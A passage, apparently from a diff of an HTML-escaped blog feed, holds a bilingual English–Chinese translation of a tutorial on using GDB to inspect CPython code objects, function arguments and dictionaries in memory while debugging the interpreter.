-  &lt;p&gt;等等! 你說的每個實例的資料在哪裡 ? 對於沒有定義 &lt;em&gt;__slots__&lt;/em&gt; 的類別來說，有一個對應的 PyTypeObject 結構 &lt;em&gt;dictoffset&lt;/em&gt; 成員。透過從 PyObject 結構底部位移包含一個 Python 字典。這是 &lt;em&gt;__dict__&lt;/em&gt; 用來儲存每個實例的資訊。倘若有定義 &lt;em&gt;__slots__&lt;/em&gt;，則 dictoffset 為 &lt;em&gt;NULL&lt;/em&gt; 且位置值被存放在 PyObject 結構底部並透過描述子存取。一般的結構透過轉型到處傳遞(而且透過一樣的方法轉變回具體的值)&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;p&gt;Somewhat related bonus Python trivia: The class dictionary is actually a PyDictProxy_Type that refers to the type’s tp_dict field.  You can’t edit it directly.&lt;/p&gt;
-&lt;blockquote&gt;
-  &lt;p&gt;一點相關的額外 Python 瑣事: 字典類別實際上是一個 PyDictProxy_Type 參考自 type 的 tp_dict 欄位。你不能直接修改他。&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;p&gt;To clarify, assuming we have a type NinjaTurtle that is represented by PyTypeObject *ninja, then for an instance donatello, the following is true: (PyObject *)donatello-&amp;gt;ob_type = ninja; Good. So, naturally, to perform an init call, the corresponding code would like like the following:&lt;/p&gt;
-
-&lt;blockquote&gt;
-  &lt;p&gt;為了闡明一點，假設我們有一個型別 &lt;em&gt;NinjaTurtle&lt;/em&gt; 是用 &lt;em&gt;PyTypeObject *ninja&lt;/em&gt; 來表示，那麼有一個實例 &lt;em&gt;donatello&lt;/em&gt;(編按:其中一隻忍者龜的名字)，則下列為真: &lt;em&gt;(PyOject *)donatello-&amp;gt;ob_type = ninja;&lt;/em&gt; 很好。所以，自然地，為了表現一個初始化呼叫，對應的程式碼可能看起來(編按: 原文為 like like 應為打錯，故翻為 look like)如下:&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;donatello-&amp;gt;ob_type-&amp;gt;tp_init((PyObject *)donatello);&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;In fact, this is almost exactly what happens when a type is called directly (ala class instantiation: MyClass()).&lt;/p&gt;
-&lt;blockquote&gt;
-  &lt;p&gt;事實上，這是當一個類型被直接呼叫的時候幾乎會發生的事情(也稱為類別實例化: MyClass()，編按:原文又把 aka 打成 ala 了…)。&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;h3 id=&quot;code-objects--程式碼物件&quot;&gt;Code Objects / 程式碼物件&lt;/h3&gt;
-
-&lt;p&gt;Let’s look at one final object, the code object. This is represented by a structure defined in code.h.  It is rather simple object (though note the first member).&lt;/p&gt;
-&lt;blockquote&gt;
-  &lt;p&gt;讓我們來看最後一個物件，程式碼物件。在 &lt;em&gt;code.h&lt;/em&gt; 使用一個結構來定義。這是一個相當簡單的物件 (不過請注意第一個成員)。&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;/* Bytecode object */
-typedef struct {
-    PyObject_HEAD
-    int co_argcount;    /* #arguments, except *args */
-    int co_nlocals;   /* #local variables */
-    int co_stacksize;   /* #entries needed for evaluation stack */
-    int co_flags;   /* CO_..., see below */
-    PyObject *co_code;    /* instruction opcodes */
-    PyObject *co_consts;  /* list (constants used) */
-    PyObject *co_names;   /* list of strings (names used) */
-    PyObject *co_varnames;  /* tuple of strings (local variable names) */
-    PyObject *co_freevars;  /* tuple of strings (free variable names) */
-    PyObject *co_cellvars;      /* tuple of strings (cell variable names) */
-    /* The rest doesn't count for hash/cmp */
-    PyObject *co_filename;  /* string (where it was loaded from) */
-    PyObject *co_name;    /* string (name, for reference) */
-    int co_firstlineno;   /* first source line number */
-    PyObject *co_lnotab;  /* string (encoding addr&amp;lt;-&amp;gt;lineno mapping) See
-           Objects/lnotab_notes.txt for details. */
-    void *co_zombieframe;     /* for optimization only (see frameobject.c) */
-    PyObject *co_weakreflist;   /* to support weakrefs to code objects */
-} PyCodeObject;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;From here, we can switch into Python. Note the above fields and then have a peek at a function’s func_code attribute (__code__ in 3.x):&lt;/p&gt;
-
-&lt;blockquote&gt;
-  &lt;p&gt;從這裡，我們可以切換到 Python。注意上面的欄位並且看一下函式的 &lt;em&gt;func_code&lt;/em&gt; 屬性 (在 py3 為 &lt;em&gt;__code__&lt;/em&gt;)&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;gt;&amp;gt;&amp;gt;
-&amp;gt;&amp;gt;&amp;gt; def f(): pass
-...
-[66987 refs]
-&amp;gt;&amp;gt;&amp;gt; import pprint
-[67863 refs]
-&amp;gt;&amp;gt;&amp;gt; pprint.pprint(dir(f.func_code))
-['__class__',
-'__delattr__',
-'__dir__',
-'__doc__',
-'__eq__',
-'__format__',
-'__ge__',
-'__getattribute__',
-'__gt__',
-'__hash__',
-'__init__',
-'__le__',
-'__lt__',
-'__ne__',
-'__new__',
-'__reduce__',
-'__reduce_ex__',
-'__repr__',
-'__setattr__',
-'__sizeof__',
-'__str__',
-'__subclasshook__',
-'co_argcount',
-'co_cellvars',
-'co_code',
-'co_consts',
-'co_filename',
-'co_firstlineno',
-'co_flags',
-'co_freevars',
-'co_kwonlyargcount',
-'co_lnotab',
-'co_name',
-'co_names',
-'co_nlocals',
-'co_stacksize',
-'co_varnames']
-[67870 refs]
-&amp;gt;&amp;gt;&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Perfect. Now we’ve made the connection between Python and C. Now we can take a look at the actual debugging process.&lt;/p&gt;
-
-&lt;blockquote&gt;
-  &lt;p&gt;完美。現在我們將 Python 與 C 連接起來了。我們可以來瞧瞧真正的除錯行程了。&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;h3 id=&quot;gdbing-the-py--來-gdb-py-吧&quot;&gt;GDB’ing the Py. / 來 GDB Py 吧&lt;/h3&gt;
-
-&lt;p&gt;We’ll use the same small bit of code we used above as our test script. We’re referencing /usr/bin/python here, which may vary on your system.&lt;/p&gt;
-
-&lt;blockquote&gt;
-  &lt;p&gt;我們將使用同上面一樣的小程式來當測試程式。我們這裡參考到 /usr/bin/python，在你系統上可能不同。&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;p&gt;First, we’ll start the interpreter. Note that we’re debugging Python itself, not the script passed to it. GDB will not start if we pass in the Python script as the executable.&lt;/p&gt;
-
-&lt;blockquote&gt;
-  &lt;p&gt;首先我們開啟直譯器。注意我們是要除錯 python 而非被傳進去腳本程式。如果我們傳入 python 腳本當作執行檔 GDB 將不會啟動。&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;jeff@martian:~/cpython$ gdb /usr/bin/python
-GNU gdb (GDB) 7.4-gg1
-Copyright (C) 2012 Free Software Foundation, Inc.
-License GPLv3+: GNU GPL version 3 or later &amp;lt;http://gnu.org/licenses/gpl.html&amp;gt;
-This is free software: you are free to change and redistribute it.
-There is NO WARRANTY, to the extent permitted by law.  Type &quot;show copying&quot;
-and &quot;show warranty&quot; for details.
-This GDB was configured as &quot;x86_64-linux&quot;.
-
-Reading symbols from /usr/bin/python...
-Reading symbols from /usr/lib/debug/usr/bin/python...done.
-done.
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Now we’ll set the appropriate args for the execution of Python — our script. Note that nothing is running at this point.&lt;/p&gt;
-
-&lt;blockquote&gt;
-  &lt;p&gt;現在我們要設定 python 執行參數 - 我們的腳本。
-請注意現在是沒有任何東西在執行的。&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;(gdb) set args add.py
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Now, since we want to see how to pick apart the location of our Python code from the C level, we’ll set a breakpoint at PyEval_EvalCodeEx. This forces GDB to up and stop when it gets to our function.&lt;/p&gt;
-
-&lt;blockquote&gt;
-  &lt;p&gt;現在，由於我們要觀察如何對我們的 python 程式碼在 C 語言層級吹毛求疵，我們將設下一個斷點在 &lt;em&gt;PyEval_EvalCodeEx&lt;/em&gt;。強迫 GDB 執行到我們的函式時停下來。&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;(gdb) break PyEval_EvalCodeEx
-Breakpoint 1 at 0x80e1f53: file ../../../Python/ceval.c, line 2767.
-(gdb)
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Note that if the correct source is available, this gets much easier as there is Python+GDB integration available via python-gdb.py. Now, we can run the executable:&lt;/p&gt;
-
-&lt;blockquote&gt;
-  &lt;p&gt;如果正確的原始碼是可取得的，這將會容易很多如同那些 Python+GDB 整合工具一樣。現在我們可以執行可執行檔：&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;(gdb) run
-Starting program: /usr/bin/python add.py
-
-Breakpoint 1, PyEval_EvalCodeEx (co=0xf7de7338, globals=0xf7df313c,
-   locals=0xf7df313c, args=0x0, argcount=0, kws=0x0, kwcount=0,
-   defs=0x0, defcount=0, closure=0x0)
-at ../../../Python/ceval.c:2767
-2767 ../../../Python/ceval.c: No such file or directory.
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;h3 id=&quot;understanding-the-object-representation--理解物件表示法&quot;&gt;Understanding the Object Representation / 理解物件表示法&lt;/h3&gt;
-
-&lt;p&gt;From here, we can examine the code in question. First, let’s print the value of the first argument to PyEval_EvalCodeEx. From our prototype above, we know this is a code object:&lt;/p&gt;
-
-&lt;blockquote&gt;
-  &lt;p&gt;從這裡開始，我們可以檢查程式碼裡的問題了。首先，讓我們印出 &lt;em&gt;PyEval_EvalCodeEx&lt;/em&gt; 的第一個參數。根據我們上面的原型，我們知道這是一個程式碼物件：&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;(gdb) p *co
-$1 = {ob_refcnt = 1, ob_type = 0x81a1e60, co_argcount = 0,
-  co_nlocals = 0, co_stacksize = 1, co_flags = 64,
-  co_code = 0xf7dedd40, co_consts = 0xf7dedd0c,
-  co_names = 0xf7dc102c, co_varnames = 0xf7dc102c,
-  co_freevars = 0xf7dc102c, co_cellvars = 0xf7dc102c,
-  co_filename = 0xf7de4200, co_name = 0xf7dedd60,
-  co_firstlineno = 1, co_lnotab = 0xf7dc10b0, co_zombieframe = 0x0}
-(gdb)
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Here, we see the ob_refcnt and the ob_type. If we cast this to a PyObject *, you’ll see that it only prints that information.&lt;/p&gt;
-&lt;blockquote&gt;
-  &lt;p&gt;這裡，我們看到 &lt;em&gt;ob_refcnt&lt;/em&gt; 與 &lt;em&gt;ob_type&lt;/em&gt;。如果我們把它轉型成一個 &lt;em&gt;PyObject *&lt;/em&gt;(編按：表示為 PyObject 指標)，你將會看到它唯一印出的資訊。&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;(gdb) p *(PyObject *)co
-$4 = {ob_refcnt = 1, ob_type = 0x81a1e60}
-(gdb)
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Ok, let’s step ahead until we see something interesting. We’ll “GDB continue” until we have an args=&amp;lt;value&amp;gt; which is not 0×0, or NULL.  We’ll look at the following frame:&lt;/p&gt;
-
-&lt;blockquote&gt;
-  &lt;p&gt;好的，讓我們前進一步直到我們看到一些某些有去的東西。我們將 “GDB continue” 到我們有一個 args=&amp;lt;value&amp;gt; 不是 0x0 或是 NULL 為止。我們將看到如下的 frame：&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Breakpoint 1, PyEval_EvalCodeEx (co=0xf7d8cc80, globals=0xf7d8a35c, locals=0x0,
-  args=0x81bfe7c, argcount=0, kws=0x81bfe7c, kwcount=0, defs=0x0,
-   defcount=0, closure=0x0)
-at ../../../Python/ceval.c:2767
-2767 in ../../../Python/ceval.c
-(gdb) info frame
-Stack level 0, frame at 0xfffec7a0:
-eip = 0x80e1f53 in PyEval_EvalCodeEx (../../../Python/ceval.c:2767);
-  saved eip 0x80e0cd2
-called by frame at 0xfffec890
-source language c.
-Arglist at 0xfffec798, args: co=0xf7d8cc80, globals=0xf7d8a35c,
-  locals=0x0, args=0x81bfe7c,
-  argcount=0, kws=0x81bfe7c, kwcount=0, defs=0x0, defcount=0, closure=0x0
-Locals at 0xfffec798, Previous frame's sp is 0xfffec7a0
-Saved registers:
-ebx at 0xfffec78c, ebp at 0xfffec798, esi at 0xfffec790,
-  edi at 0xfffec794, eip at 0xfffec79c
-(gdb)
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;First, let’s have a look at the co value again:&lt;/p&gt;
-&lt;blockquote&gt;
-  &lt;p&gt;首先，讓我們再看一下 &lt;em&gt;co&lt;/em&gt; 的值：&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;(gdb) p *co
-$10 = {ob_refcnt = 2, ob_type = 0x81a1e60, co_argcount = 0,
-       co_nlocals = 0, co_stacksize = 1,
-       co_flags = 99, co_code = 0xf7d8e688,
-       co_consts = 0xf7d8ddac, co_names = 0xf7dc102c,
-       co_varnames = 0xf7dc102c, co_freevars = 0xf7dc102c,
-       co_cellvars = 0xf7dc102c,
-       co_filename = 0xf7d8cc38, co_name = 0xf7d8ddc0,
-       co_firstlineno = 51, co_lnotab = 0xf7d8dde0,
-       co_zombieframe = 0x0}
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;h3 id=&quot;building-a-python-friendly-backtrace--建立一個-python-友善的回溯&quot;&gt;Building a Python Friendly Backtrace / 建立一個 Python 友善的回溯&lt;/h3&gt;
-
-&lt;p&gt;Now we can deduce where exactly this code comes from. We can pull the line number, the function name, and the file!&lt;/p&gt;
-&lt;blockquote&gt;
-  &lt;p&gt;現在我們可以推斷至這個程式碼確切是從哪來的。我們可以調出程式碼的行號、函式名稱及檔案位置。&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;(gdb) p co-&amp;gt;co_firstlineno
-$16 = 51
-(gdb) x/s ((PyStringObject)*co-&amp;gt;co_name)-&amp;gt;ob_sval
-0xf7d8ddd4: &quot;_g&quot;
-(gdb) x/s ((PyStringObject)*co-&amp;gt;co_filename)-&amp;gt;ob_sval
-0xf7d8cc4c: &quot;/usr/lib/python2.6/types.py&quot;
-(gdb)
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;So, types.py, line 51, function _g. Let’s take a look:&lt;/p&gt;
-&lt;blockquote&gt;
-  &lt;p&gt;所以，type.py, 行 51, 函數 _g。讓我們看一下：&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;jeff@martian:~$ head /usr/lib/python2.6/types.py -n 51 | tail -n 1
-def _g():
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Excellent. This is where our Python function lives! There’s no point in going into it, however, this gives us a starting point to determine where a problem lives.&lt;/p&gt;
-&lt;blockquote&gt;
-  &lt;p&gt;棒棒。這就是我們 Python 函式的所在！已經沒有理由再這個點深入了，然而這給了我們一個起始點去確定哪裡有問題。&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;h3 id=&quot;looking-up-argument-types-and-values--查找參數型態與值&quot;&gt;Looking up Argument Types and Values / 查找參數、型態與值&lt;/h3&gt;
-
-&lt;p&gt;Furthermore, we can pull out information about the arguments passed as well.  Let’s go back and determine what the type is. Remember our ‘info frame’ gave us an args parameter?&lt;/p&gt;
-
-&lt;blockquote&gt;
-  &lt;p&gt;此外，我們也可以調出有關傳入參數的資訊。讓我們回到確定型態的那裡。記得我們 ‘info frame’ 給我們一個 args 參數嘛？&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;(gdb) p *args
-$21 = (PyObject *) 0x0
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Drat! Null. This function takes no arguments.  Let’s jump down a few more frames until we find a function that includes an argument.&lt;/p&gt;
-&lt;blockquote&gt;
-  &lt;p&gt;該死！ Null. 這個函式沒有函數。讓我們往下跳一些 frame 直到我們找到一個有參數的函式。&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Breakpoint 1, PyEval_EvalCodeEx (co=0xf7d9f8d8, globals=0xf7d8a9bc, locals=0x0,
-  args=0xf7d9e1c8, argcount=4, kws=0x0, kwcount=0, defs=0x0, defcount=0, closure=0x0)
-at ../../../Python/ceval.c:2767
-2767 in ../../../Python/ceval.c
-(gdb) info frame
-Stack level 0, frame at 0xfffefa50:
-eip = 0x80e1f53 in PyEval_EvalCodeEx (../../../Python/ceval.c:2767);
-  saved eip 0x813e70e
-called by frame at 0xfffefac0
-source language c.
-Arglist at 0xfffefa48, args: co=0xf7d9f8d8, globals=0xf7d8a9bc, locals=0x0,
-  args=0xf7d9e1c8, argcount=4, kws=0x0, kwcount=0, defs=0x0, defcount=0, closure=0x0
-Locals at 0xfffefa48, Previous frame's sp is 0xfffefa50
-Saved registers:
-ebx at 0xfffefa3c, ebp at 0xfffefa48, esi at 0xfffefa40, edi at 0xfffefa44,
-  eip at 0xfffefa4c
-(gdb)
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Here we go. Now, using the above “trick”, we learn that this is line 78 in method __new__ in abc.py:&lt;/p&gt;
-&lt;blockquote&gt;
-  &lt;p&gt;有啦。現在使用在上面的 “小技巧”，我們知道這是在 abc.py 第 78 行的 __new__ 方法。&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;(gdb)p co-&amp;gt;co_firstlineno
-$24 = 78
-(gdb) x/s ((PyStringObject)*co-&amp;gt;co_name)-&amp;gt;ob_sval
-0xf7dc4694: &quot;__new__&quot;
-(gdb) x/s ((PyStringObject)*co-&amp;gt;co_filename)-&amp;gt;ob_sval
-0xf7d9f8a4: &quot;/usr/lib/python2.6/abc.py&quot;
-(gdb)
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Perfect. Now, since __new__ is (sometimes) indicative of a metaclass — and we’re looking at code from the Abstract Base Class module which I happen to know goes metaclass crazy — we should have a class, a name, a bases tuple, and an object dictionary. Let’s look at the object types:&lt;/p&gt;
-
-&lt;blockquote&gt;
-  &lt;p&gt;水喔。由於 __new__ (有時候)表示一個元類別 - 而且我們正看著 Abstract Base Class 模組的程式碼，我剛好知道那個鬼元類別 - 我們應該要有一個類別、一個名字、一的基礎元組和一個物件字典。讓我們看一下這個物件型態：&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;(gdb) x/s args[0]-&amp;gt;ob_type.tp_name
-0x81590e5 &amp;lt;.LC33+5012&amp;gt;: &quot;type&quot;
-(gdb) x/s args[1]-&amp;gt;ob_type.tp_name
-0x8158d74 &amp;lt;.LC33+4131&amp;gt;: &quot;str&quot;
-(gdb) x/s args[2]-&amp;gt;ob_type.tp_name
-0x8158f43 &amp;lt;.LC33+4594&amp;gt;: &quot;tuple&quot;
-(gdb) x/s args[3]-&amp;gt;ob_type.tp_name
-0x8156ea5 &amp;lt;.LC16+1319&amp;gt;: &quot;dict&quot;
-(gdb)
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Perfect! We’ve found the location of the code executing and the types of arguments that it takes.  What if we wanted to see, for example, the actual name passed in instead of the “str” type? Simple. We just repeat what we’ve already learned:&lt;/p&gt;
-
-&lt;p&gt;讚啦！我們找到了程式碼執行與參數型態用到的位置了。舉例來說，如果我們要看確切傳入的名字而非 “str” 型態？簡單。我們只要重複我們已經學到的：&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;(gdb) x/s (*(PyStringObject *)args[1]).ob_sval
-0xf7d96054: &quot;Hashable&quot;
-(gdb) p (*(PyStringObject *)args[1]).ob_refcnt
-$38 = 8
-(gdb)
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Now we know, without looking at a line of Python, that this is the __new__ method of the metaclass for the Hashable ABC and the name of the class has a reference count of 8.&lt;/p&gt;
-
-&lt;blockquote&gt;
-  &lt;p&gt;現在我們知道，不用看一行 Python 程式碼，這是一個 __new__ 元類別的方法用來可雜湊的 ABC 與類別名跟參考計量為 8。&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;h3 id=&quot;accessing-dictionaries--存取字典&quot;&gt;Accessing Dictionaries / 存取字典&lt;/h3&gt;
-
-&lt;p&gt;Finally, what about something more detailed? Let’s look at the dictionary passed here.&lt;/p&gt;
-&lt;blockquote&gt;
-  &lt;p&gt;最終，那更詳細的呢。讓我們看一下這裡的字典傳遞。&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;(gdb) p *((PyDictObject*)args[3])
-$51 = {ob_refcnt = 3, ob_type = 0x81854a0, ma_fill = 4, ma_used = 4, ma_mask = 7,
-  ma_table = 0xf7d8aa60, ma_lookup = 0x808c70c , ma_smalltable = {
-   {me_hash = 435549560, me_key = 0xf7dc44e0, me_value = 0xf7d9b4fc},
-   {me_hash = 0, me_key = 0x0, me_value = 0x0},
-   {me_hash = 1333480578, me_key = 0xf7dc2a20, me_value = 0xf7d9d5a0},
-   {me_hash = -1120181165,me_key = 0xf7dc2688, me_value = 0xf7dc132c},
-   {me_hash = 1733367940, me_key = 0xf7d942f0, me_value = 0x81c3e64},
-   {me_hash = 0, me_key = 0x0, me_value = 0x0},
-   {me_hash = 0, me_key = 0x0, me_value = 0x0},
-   {me_hash = 0, me_key = 0x0, me_value = 0x0}}}
-(gdb)
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;What’s all of this me business? Let’s look at one of the items in the hash table representing the dictionary.&lt;/p&gt;
-&lt;blockquote&gt;
-  &lt;p&gt;這一團 me 是怎麼回事？讓我們看一下用雜湊表來表示的字典中的其中一個項目。&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;(gdb) p *((PyTypeObject*)((PyDictObject*)args[3])-&amp;gt;ma_smalltable[2].me_key.ob_type)
-$64 = {ob_refcnt = 71, ob_type = 0x818a940, ob_size = 0, tp_name = 0x8158d74 &quot;str&quot;,
-  tp_basicsize = 24, tp_itemsize = 1, tp_dealloc = 0x809d982 ,
-  tp_print = 0x809d74c , tp_getattr = 0, tp_setattr = 0, tp_compare = 0,
-  tp_repr = 0x809ec77 , tp_as_number = 0x8187fe0, tp_as_sequence = 0x8188080,
-  tp_as_mapping = 0x81880a8, tp_hash = 0x809c5a9 , tp_call = 0, tp_str = 0x809e602 ,
-  tp_getattro = 0x8091091 ,
-  tp_setattro = 0x8090e1a , tp_as_buffer = 0x81880b4, tp_flags = 136713723,
-  tp_doc = 0x81880e0
-   &quot;str(object) -&amp;gt; string\n\nReturn a nice string representation of the object.\n
-        If the argument is a string, the return value is the same object.&quot;,
-  tp_traverse = 0,
-  tp_clear = 0, tp_richcompare = 0x809cd84 , tp_weaklistoffset = 0, tp_iter = 0,
-  tp_iternext = 0, tp_methods = 0x8188180, tp_members = 0x0, tp_getset = 0x0,
-  tp_base = 0x8187c00, tp_dict = 0xf7dc34f4, tp_descr_get = 0, tp_descr_set = 0,
-  tp_dictoffset = 0, tp_init = 0x80ac582 , tp_alloc = 0x80ad345 ,
-  tp_new = 0x80a2fcc , tp_free = 0x8094510 , tp_is_gc = 0, tp_bases = 0xf7dc4f0c,
-  tp_mro = 0xf7dc7fa4, tp_cache = 0x0, tp_subclasses = 0x0,
-  tp_weaklist = 0xf7dc7fcc, tp_del = 0, tp_version_tag = 0}
-(gdb)
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Excellent. The key type is a string. What’s the value?&lt;/p&gt;
-&lt;blockquote&gt;
-  &lt;p&gt;不錯喔。主要的型態是一個字串。那值是什麼？&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;(gdb) x/s ((PyStringObject *)((PyTypeObject*)((
-    PyDictObject*)args[3])-&amp;gt;ma_smalltable[2].me_value)).ob_sval
-0xf7d9d5b4: &quot;_abcoll&quot;
-(gdb)
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;The value of this entry is the string “_abcoll.” Note that the key type doesn’t reference the value type. I left out the step in which I looked up the value’s type.&lt;/p&gt;
-&lt;blockquote&gt;
-  &lt;p&gt;這個項目的值是字串 “_abcoll.” 注意這個主要型態沒有參考值型態。我忽略的搜尋值得型態的步驟。&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;h3 id=&quot;closing-notes--結語&quot;&gt;Closing Notes / 結語&lt;/h3&gt;
-
-&lt;p&gt;The most important step in understanding how to do this is having Python source available. You’re debugging a C program here; you want to access structure members and fields.  Given the above knowledge, you should be able to walk through and display information about almost any Python object in memory. A big help.&lt;/p&gt;
-
-&lt;blockquote&gt;
-  &lt;p&gt;了解如何做這些事情最重要的步驟是擁有一份 Python 原始碼。你在這裡除錯 C 程式語言;你想要存取結構成員與欄位。考慮到上述的知識，你應當可以檢視並顯示有關幾乎任何在記憶體中的 Python 物件。一個大大的幫助。&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;h3 id=&quot;what-about-the-shared-libraries---那有關分享函式庫呢-&quot;&gt;What about the shared libraries ? / 那有關分享函式庫呢 ?&lt;/h3&gt;
-
-&lt;p&gt;If you’re referencing shared object files that aren’t in standard library paths, you can add them to your GDB shared object search path from your local directory as follows:&lt;/p&gt;
-
-&lt;blockquote&gt;
-  &lt;p&gt;如果你正參考到不在標準函式路徑中的分享函式庫目的檔，你可以將他們從本地目錄加到你的 GDB shared object search path 如下:&lt;/p&gt;
-&lt;/blockquote&gt;
-
